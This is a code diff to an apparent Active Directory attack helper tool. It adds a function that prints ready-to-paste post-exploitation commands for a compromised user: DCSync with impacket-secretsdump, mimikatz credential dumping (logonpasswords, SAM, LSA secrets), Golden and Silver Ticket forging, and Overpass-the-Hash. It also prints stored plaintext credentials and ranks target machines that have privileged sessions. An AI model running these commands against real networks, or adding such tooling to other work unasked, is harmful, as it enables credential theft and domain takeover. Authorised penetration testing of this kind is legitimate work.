@@ -475,6 +475,7 @@ def print_pwned_followup_commands(
     cred_values: List[str] = None,
     dc_ip: str = None,
     dc_hostname: str = None,
+    domain_sid: str = None,
 ) -> None:
     """
     Print follow-up commands after marking a user as pwned.
@@ -724,6 +725,20 @@ def print_pwned_followup_commands(
 
     print(f"{'='*70}")
 
+    # Auto-show post-exploitation commands if user has local-admin or domain-admin access
+    has_local_admin = any(a.privilege_level == "local-admin" for a in access)
+    if has_local_admin or domain_level_access:
+        print_post_exploit_commands(
+            user_name=user_name,
+            access=access,
+            domain_level_access=domain_level_access,
+            cred_types=cred_types,
+            cred_values=cred_values,
+            dc_ip=dc_ip,
+            domain_sid=domain_sid,
+            use_colors=use_colors,
+        )
+
     # Show authenticated user attacks ONCE at the bottom (template form)
     # These are generic - same for any domain user
     print_authenticated_attacks_template(use_colors=use_colors, dc_ip=dc_ip)
@@ -848,6 +863,267 @@ def print_cred_harvest_targets(
         print(f"  {c.DIM}... and {len(targets) - 10} more targets{c.RESET}")
 
     print()
+
+
+def print_post_exploit_commands(
+    user_name: str,
+    access: List = None,  # List[MachineAccess]
+    domain_level_access: str = None,
+    cred_types: List[str] = None,
+    cred_values: List[str] = None,
+    dc_ip: str = None,
+    domain_sid: str = None,
+    use_colors: bool = True,
+) -> None:
+    """
+    Display mimikatz post-exploitation recommendations based on privilege level.
+
+    Shows credential harvest order with copy-paste ready commands,
+    educational tips for what to look for, and next steps after harvesting.
+
+    Args:
+        user_name: User UPN (USER@DOMAIN.COM)
+        access: List of MachineAccess objects
+        domain_level_access: 'domain-admin' if user has DA-level rights
+        cred_types: List of credential types the user has
+        cred_values: List of corresponding credential values
+        dc_ip: Domain Controller IP address
+        domain_sid: Domain SID for Golden/Silver ticket (e.g., S-1-5-21-...)
+        use_colors: Enable ANSI colors
+    """
+    from .command_mappings import (
+        get_post_exploit_commands,
+        get_harvest_tips,
+        get_arg_acquisition,
+        CRED_TYPE_TEMPLATES,
+        fill_pwned_command,
+        infer_dc_hostname,
+    )
+
+    c = Colors if use_colors else _NoColors
+    access = access or []
+    cred_types = cred_types or ["password"]
+
+    # Extract username and domain
+    if "@" in user_name:
+        username, domain = user_name.split("@")
+    else:
+        username = user_name
+        domain = ""
+
+    # Determine DC target
+    dc_target = dc_ip or infer_dc_hostname(domain)
+
+    # Group access by privilege level
+    local_admin_targets = [a for a in access if a.privilege_level == "local-admin"]
+    session_targets = [a for a in local_admin_targets if a.sessions]
+
+    # Header
+    print()
+    print(f"{c.CYAN}{'═'*75}{c.RESET}")
+    print(f"  {c.BOLD}POST-EXPLOITATION COMMANDS{c.RESET} ({c.YELLOW}{user_name}{c.RESET})")
+    print(f"{c.CYAN}{'═'*75}{c.RESET}")
+
+    # =========================================================================
+    # STORED CREDENTIALS
+    # =========================================================================
+    if cred_types and cred_values:
+        print()
+        print(f"  {c.BOLD}STORED CREDENTIALS{c.RESET}")
+        print(f"  {c.DIM}{'─'*70}{c.RESET}")
+        for ctype, cval in zip(cred_types, cred_values):
+            if cval and cval not in ("<PASSWORD>", "<HASH>", "<TICKET_PATH>"):
+                # Format credential type nicely
+                ctype_display = ctype.replace("-", " ").title()
+                print(f"    {c.DIM}{ctype_display}:{c.RESET}  {c.GREEN}{cval}{c.RESET}")
+
+    # =========================================================================
+    # DOMAIN ADMIN SECTION
+    # =========================================================================
+    if domain_level_access:
+        print()
+        print(f"  {c.RED}{c.BOLD}DOMAIN ADMIN ACCESS{c.RESET}")
+        print(f"  {c.DIM}{'─'*70}{c.RESET}")
+
+        # DCSync - remote preferred
+        da_commands = get_post_exploit_commands("domain-admin", "remote_preferred")
+        print(f"\n  {c.CYAN}DCSync (remote - safer):{c.RESET}")
+
+        for cmd_tuple in da_commands:
+            # Tuples are (cmd_id, description, module, ...)
+            description = cmd_tuple[1] if len(cmd_tuple) > 1 else ""
+
+            # Use impacket secretsdump template
+            template = "impacket-secretsdump -just-dc '<DOMAIN>/<USERNAME>:<CRED_VALUE>'@<DC_IP>"
+            if cred_types and cred_types[0] == "ntlm-hash":
+                template = "impacket-secretsdump -just-dc -hashes :<CRED_VALUE> '<DOMAIN>/<USERNAME>'@<DC_IP>"
+            cmd = template.replace("<USERNAME>", username).replace("<DOMAIN>", domain.lower())
+            cmd = cmd.replace("<DC_IP>", dc_target)
+            cmd = cmd.replace("<CRED_VALUE>", "<PASSWORD>" if not cred_types or cred_types[0] == "password" else "<HASH>")
+            print(f"    {c.GREEN}{cmd}{c.RESET}")
+            print(f"    {c.DIM}→ {description}{c.RESET}")
+
+        # Golden Ticket (after obtaining krbtgt hash)
+        print(f"\n  {c.CYAN}Golden Ticket (after obtaining krbtgt hash):{c.RESET}")
+        sid_value = domain_sid if domain_sid else "<SID>"
+        print(f"    {c.GREEN}mimikatz.exe \"kerberos::golden /user:{username} /domain:{domain.lower()} /sid:{sid_value} /krbtgt:<KRBTGT_HASH> /ptt\"{c.RESET}")
+
+        # Arg acquisition for Golden Ticket - only show missing args
+        missing_args = ["<KRBTGT_HASH>"]
+        if not domain_sid:
+            missing_args.insert(0, "<SID>")
+        _print_arg_acquisition(missing_args, c)
+
+    # =========================================================================
+    # LOCAL ADMIN SECTION
+    # =========================================================================
+    if local_admin_targets:
+        print()
+        print(f"  {c.RED}{c.BOLD}LOCAL ADMIN ACCESS{c.RESET} ({len(local_admin_targets)} machines)")
+        print(f"  {c.DIM}{'─'*70}{c.RESET}")
+
+        # Priority targets with sessions
+        if session_targets:
+            print()
+            print(f"  {c.YELLOW}★ PRIORITY TARGETS (Privileged Sessions Detected) ★{c.RESET}")
+            for target in session_targets[:5]:
+                sessions_str = ", ".join(target.sessions[:3])
+                print(f"    {c.BOLD}{target.computer}{c.RESET}: Sessions from {c.YELLOW}{sessions_str}{c.RESET}")
+                print(f"      {c.DIM}→ Run sekurlsa::logonpasswords to harvest these credentials!{c.RESET}")
+
+        # Credential harvest order
+        print()
+        print(f"  {c.CYAN}CREDENTIAL HARVEST ORDER:{c.RESET}")
+        print()
+
+        harvest_commands = get_post_exploit_commands("local-admin", "credential_harvest")
+
+        # Table header
+        print(f"    {'#':<3} {'Command (copy-paste ready)':<62} {'Priority':<8}")
+        print(f"    {'─'*3} {'─'*62} {'─'*8}")
+
+        for idx, cmd_tuple in enumerate(harvest_commands, 1):
+            # Tuples are (cmd_id, description, module, priority)
+            cmd_id = cmd_tuple[0]
+            description = cmd_tuple[1]
+            module = cmd_tuple[2] if len(cmd_tuple) > 2 else cmd_id
+            priority = cmd_tuple[3] if len(cmd_tuple) > 3 else "medium"
+
+            # Build one-liner mimikatz command using the module
+            mimi_cmd = f'mimikatz.exe "privilege::debug" "{module}" "exit"'
+
+            priority_color = c.RED if priority == "high" else (c.YELLOW if priority == "medium" else c.DIM)
+            print(f"    {idx:<3} {c.GREEN}{mimi_cmd:<62}{c.RESET} {priority_color}{priority.upper():<8}{c.RESET}")
+
+        # Educational tips for harvest techniques
+        _print_harvest_tips("sekurlsa::logonpasswords", c)
+        _print_harvest_tips("sekurlsa::tickets", c)
+        _print_harvest_tips("lsadump::sam", c)
+        _print_harvest_tips("lsadump::secrets", c)
+
+        # With harvested hash section
+        print()
+        print(f"  {c.CYAN}WITH HARVESTED NTLM HASH:{c.RESET}")
+        print()
+
+        # Overpass-the-Hash
+        print(f"    {c.DIM}# Overpass-the-Hash (NTLM → Kerberos ticket):{c.RESET}")
+        print(f"    {c.GREEN}mimikatz.exe \"sekurlsa::pth /user:{username} /domain:{domain.lower()} /ntlm:<HASH> /run:cmd.exe\"{c.RESET}")
+        print()
+        print(f"    {c.YELLOW}⚠ IMPORTANT: Use HOSTNAME not IP after Overpass-the-Hash!{c.RESET}")
+        print(f"      {c.GREEN}✓ dir \\\\DC01\\C${c.RESET}  {c.DIM}(Kerberos - uses ticket){c.RESET}")
+        print(f"      {c.RED}✗ dir \\\\10.0.0.1\\C${c.RESET}  {c.DIM}(NTLM - bypasses ticket!){c.RESET}")
+
+        # Silver Ticket
+        print()
+        print(f"    {c.DIM}# Silver Ticket (requires service account hash):{c.RESET}")
+        first_target = local_admin_targets[0].computer if local_admin_targets else "TARGET.DOMAIN.COM"
+        sid_value = domain_sid if domain_sid else "<SID>"
+        print(f"    {c.GREEN}mimikatz.exe \"kerberos::golden /domain:{domain.lower()} /sid:{sid_value} /target:{first_target.lower()} /service:cifs /rc4:<SERVICE_HASH> /user:{username} /ptt\"{c.RESET}")
+
+        # Arg acquisition for Silver Ticket - only show missing args
+        missing_args = ["<SERVICE_HASH>", "<TARGET_SPN>"]
+        if not domain_sid:
+            missing_args.insert(0, "<SID>")
+        _print_arg_acquisition(missing_args, c)
+
+    # =========================================================================
+    # NO PRIVILEGED ACCESS
+    # =========================================================================
+    if not local_admin_targets and not domain_level_access:
+        print()
+        print(f"  {c.DIM}No local-admin or domain-admin access detected.{c.RESET}")
+        print(f"  {c.DIM}Post-exploitation commands require elevated privileges.{c.RESET}")
+
+        # Show limited options for user-level access
+        user_commands = get_post_exploit_commands("user-level", "limited")
+        if user_commands:
+            print()
+            print(f"  {c.CYAN}LIMITED OPTIONS (User-Level):{c.RESET}")
+            for cmd_tuple in user_commands:
+                # Tuples are (cmd_id, description, module, ...)
+                description = cmd_tuple[1] if len(cmd_tuple) > 1 else ""
+                module = cmd_tuple[2] if len(cmd_tuple) > 2 else cmd_tuple[0]
+                print(f"    {c.GREEN}mimikatz.exe \"{module}\"{c.RESET}")
+                print(f"    {c.DIM}→ {description}{c.RESET}")
+
+    print()
+    print(f"{c.CYAN}{'═'*75}{c.RESET}")
+
+
+def _print_harvest_tips(technique: str, c) -> None:
+    """Print educational tips for a specific harvest technique."""
+    from .command_mappings import get_harvest_tips
+
+    tips = get_harvest_tips(technique)
+
+    if not tips.get("what_to_look_for") and not tips.get("next_steps"):
+        return
+
+    print()
+    print(f"    {c.DIM}┌─ {technique} ────────────────────────────────────────────────────┐{c.RESET}")
+
+    if tips.get("what_to_look_for"):
+        print(f"    {c.DIM}│{c.RESET} {c.BOLD}WHAT TO LOOK FOR:{c.RESET}")
+        for item in tips["what_to_look_for"][:4]:
+            print(f"    {c.DIM}│{c.RESET}   • {item}")
+
+    if tips.get("next_steps"):
+        print(f"    {c.DIM}│{c.RESET}")
+        print(f"    {c.DIM}│{c.RESET} {c.BOLD}NEXT STEPS:{c.RESET}")
+        for item in tips["next_steps"][:4]:
+            print(f"    {c.DIM}│{c.RESET}   • {c.GREEN}{item}{c.RESET}")
+
+    print(f"    {c.DIM}└───────────────────────────────────────────────────────────────────┘{c.RESET}")
+
+
+def _print_arg_acquisition(placeholders: List[str], c) -> None:
+    """Print arg acquisition hints for critical placeholders."""
+    from .command_mappings import get_arg_acquisition
+
+    print()
+    print(f"    {c.DIM}┌─ ARG ACQUISITION ─────────────────────────────────────────────────┐{c.RESET}")
+
+    for ph in placeholders:
+        arg_info = get_arg_acquisition(ph)
+        if not arg_info:
+            continue
+
+        print(f"    {c.DIM}│{c.RESET} {c.BOLD}{ph}{c.RESET} - {arg_info.get('description', '')}")
+
+        quick_cmds = arg_info.get("quick_commands", [])
+        for cmd in quick_cmds[:2]:
+            print(f"    {c.DIM}│{c.RESET}   → {c.GREEN}{cmd}{c.RESET}")
+
+        if arg_info.get("requires"):
+            print(f"    {c.DIM}│{c.RESET}   {c.YELLOW}Requires: {arg_info['requires']}{c.RESET}")
+
+        if arg_info.get("example"):
+            print(f"    {c.DIM}│{c.RESET}   {c.DIM}Example: {arg_info['example']}{c.RESET}")
+
+        print(f"    {c.DIM}│{c.RESET}")
+
+    print(f"    {c.DIM}└───────────────────────────────────────────────────────────────────┘{c.RESET}")
 
 
 # =============================================================================
